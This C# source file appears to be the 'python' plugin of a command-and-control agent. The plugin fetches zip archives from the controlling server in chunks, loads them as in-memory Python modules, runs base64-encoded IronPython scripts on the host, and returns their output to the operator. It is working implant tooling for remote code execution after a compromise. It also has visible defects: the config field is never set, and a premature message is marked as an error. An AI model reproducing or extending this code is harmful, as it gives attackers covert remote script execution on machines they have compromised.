using System.Text;
using System.Text.Json;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using IronPython.Hosting;
using IronPython.Modules;
using Microsoft.Scripting;
using Microsoft.Scripting.Hosting;
using python;

namespace Agent
{
    //Manage the load command for python to also load the stdlib
    public class Plugin : IFilePlugin
    {
        public string Name => "python";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig config { get; set; }
        ScriptRuntime runtime {get; set;}
        ScriptEngine engine { get; set; }
        ScriptScope scope { get; set; }
        List<dynamic> metaPath { get; set; }
        private Dictionary<string, List<byte>> files = new Dictionary<string, List<byte>>();
        private Dictionary<string, ServerUploadJob> uploadJobs { get; set; }
        private Dictionary<string, ManualResetEventSlim> signals { get; set; }
        private MemoryStream stream = new MemoryStream();
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.runtime = Python.CreateRuntime();
            this.runtime.IO.SetOutput(stream, System.Text.Encoding.Default);
            this.engine = Python.GetEngine(this.runtime);
            this.scope = engine.GetSysModule();
            this.metaPath = scope.GetVariable("meta_path");
            this.uploadJobs = new Dictionary<string, ServerUploadJob>();
            this.signals = new Dictionary<string, ManualResetEventSlim>();
        }
        public async Task Execute(ServerJob job)
        {
            PythonArgs args = JsonSerializer.Deserialize<PythonArgs>(job.task.parameters);
            string message = string.Empty;
            if(args is null || !args.Validate(out message))
            {
                if(args is null)
                {
                    message = "failed to parse args";
                }

                await this.AddErrorResponse(job.task.id, message, true);
                return;
            }

            switch (args.action.ToLower())
            {
                case "run":
                    await this.Run(job, args);
                    break;
                case "reset":
                    await this.Reset(job);
                    break;
                case "load":
                    await this.Load(job, args);
                    break;
            }
            
        }

        private async Task Run(ServerJob job, PythonArgs args)
        {
            if (!string.IsNullOrEmpty(args.file))
            {
                this.StartGetFile(job, args.file);
                
                await this.messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Processing zip",
                    status = "error",
                    completed = true,
                });
                
                this.signals[job.task.id].Wait();
                
                if (!this.files.ContainsKey(job.task.id))
                {
                    await AddErrorResponse(job.task.id, "Transfer failed.", true);
                    return;
                }
                using(MemoryStream stream = new MemoryStream())
                {
                    this.engine.Runtime.IO.SetOutput(stream, System.Text.Encoding.Default);
                }
                var importer = new ByteArrayMetaPathImporter(this.files[job.task.id].ToArray());
                this.metaPath.Add(importer);
                this.scope.SetVariable("meta_path", metaPath);
            }

            string source = Misc.Base64Decode(args.script);
            var script = engine.CreateScriptSourceFromString(source, SourceCodeKind.Statements);
            List<string> script_args = new List<string>();
            foreach(var arg in Misc.SplitCommandLine(args.arguments))
            {
                script_args.Add(arg);
            }
            this.engine.GetSysModule().SetVariable("argv", script_args);
            //Todo figure out how to get output in a repeatable manner
            script.Execute();
            string output = Encoding.ASCII.GetString(this.stream.ToArray());
            clearMemoryStream();

            await this.messageManager.AddResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = output,
                completed = true,
            });
            return;
        }

        private async Task Load(ServerJob job, PythonArgs args)
        {
            this.StartGetFile(job, args.file);
            this.signals[job.task.id].Wait();

            if (!this.files.ContainsKey(job.task.id))
            {
                await AddErrorResponse(job.task.id, "Transfer failed.", true);
                return;
            }

            var importer = new ByteArrayMetaPathImporter(this.files[job.task.id].ToArray());
            this.metaPath.Add(importer);
            this.scope.SetVariable("meta_path", metaPath);
            await this.messageManager.AddResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = "Transfer succeeded.",
                completed = true,
            });
        }

        private async Task Reset(ServerJob job)
        {
            this.runtime = Python.CreateRuntime();
            this.stream = new MemoryStream();
            this.runtime.IO.SetOutput(stream, System.Text.Encoding.Default);
            this.engine = Python.GetEngine(this.runtime);
            this.scope = engine.GetSysModule();
            this.metaPath = scope.GetVariable("meta_path");
            await this.messageManager.AddResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = "Context reset.",
                completed = true,
            });
        }

        public async Task HandleNextMessage(ServerResponseResult response)
        {
            ServerUploadJob uploadJob = this.GetJob(response.task_id);

            //Did we get an upload job
            if (uploadJob == null)
            {
                await AddErrorResponse(response.task_id, "Failed to get job", true);
                CleanUpJob(response.task_id, true);
                return;
            }

            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                await AddErrorResponse(response.task_id, "Cancellation Requested", true);
                CleanUpJob(response.task_id, true);
                return;
            }

            if (uploadJob.total_chunks == 0)
            {
                if (response.total_chunks == 0)
                {
                    await AddErrorResponse(response.task_id, "Failed to get number of chunks", true);
                    CleanUpJob(response.task_id, true);
                    return;
                }

                uploadJob.total_chunks = response.total_chunks;
            }

            if (string.IsNullOrEmpty(response.chunk_data))
            {
                await AddErrorResponse(response.task_id, "No chunk data received", true);
                CleanUpJob(response.task_id, true);
                return;
            }

            if(!this.files.ContainsKey(response.task_id))
            {
                await AddErrorResponse(response.task_id, "Key not found.", true);
                CleanUpJob(response.task_id, true);
                return;
            }

            this.files[response.task_id].AddRange(Misc.Base64DecodeToByteArray(response.chunk_data));

            //Increment chunk number for tracking
            uploadJob.chunk_num++;

            UploadTaskResponse uploadResponse = PrepareResponse(response, uploadJob);

            if (response.chunk_num == uploadJob.total_chunks)
            {
                uploadResponse.completed = true;
                CleanUpJob(response.task_id, false);
            }

            //Return response
            await messageManager.AddResponse(uploadResponse.ToJson());
        }
        private void StartGetFile(ServerJob job, string file_id)
        {
            ServerUploadJob uploadJob = new ServerUploadJob(job, this.config.chunk_size)
            {
                file_id = file_id,
                task = job.task,
                chunk_num = 1,
            };

            this.files.Add(job.task.id, new List<byte>());
            this.uploadJobs.Add(job.task.id, uploadJob);
            this.signals.Add(job.task.id, new ManualResetEventSlim(false));
            this.messageManager.AddResponse(uploadJob.ToString());

        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        private ServerUploadJob GetJob(string task_id)
        {
            return uploadJobs[task_id];
        }

        private void CleanUpJob(string task_id, bool error)
        {
            if (this.uploadJobs.ContainsKey(task_id))
            {
                this.uploadJobs.Remove(task_id);
            }

            if (this.files.ContainsKey(task_id) && error)
            {
                this.files.Remove(task_id);
            }

            if (this.signals.ContainsKey(task_id))
            {
                this.signals[task_id].Set();
                this.signals.Remove(task_id);
            }
        }
        private async Task AddErrorResponse(string taskId, string userOutput, bool isCompleted)
        {
            await messageManager.AddResponse(new TaskResponse
            {
                status = "error",
                completed = isCompleted,
                task_id = taskId,
                user_output = userOutput,
            }.ToJson());
        }
        private UploadTaskResponse PrepareResponse(ServerResponseResult response, ServerUploadJob uploadJob)
        {
            var uploadResponse = new UploadTaskResponse()
            {
                task_id = response.task_id,
                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
                upload = new UploadTaskResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };

            if (response.chunk_num == uploadJob.total_chunks)
            {
                uploadResponse = new UploadTaskResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadTaskResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
            }

            return uploadResponse;
        }

        private void clearMemoryStream()
        {
            byte[] buf = this.stream.GetBuffer();
            Array.Clear(buf, 0, buf.Length);
            this.stream.Position = 0;
            this.stream.SetLength(0);
        }
    }
}
